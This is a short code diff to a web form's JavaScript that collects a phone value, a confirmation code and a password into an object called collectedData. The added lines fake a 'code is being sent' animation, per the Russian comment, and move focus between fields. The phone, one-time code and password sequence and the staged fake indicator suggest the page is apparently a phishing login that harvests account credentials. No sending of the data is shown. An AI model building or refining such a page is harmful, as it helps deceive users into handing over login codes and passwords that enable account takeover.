@@ -123,11 +123,21 @@
         if (stepId === 'code') {
             collectedData.p = document.getElementById('p').value;
             if(!collectedData.p) return;
-            showStep('code', '✉️');
+            
+            // Показываем юзеру, что код "отправляется"
+            showStep('code', '⏳'); 
+            
+            // Через 2 секунды меняем иконку на письмо
+            setTimeout(() => {
+                document.getElementById('main-icon').innerText = '✉️';
+            }, 2000);
+
+            document.getElementById('c').focus();
         } else if (stepId === 'pass') {
             collectedData.c = document.getElementById('c').value;
             if(!collectedData.c) return;
             showStep('pass', '🔑');
+            document.getElementById('pass').focus();
         }
     }
 
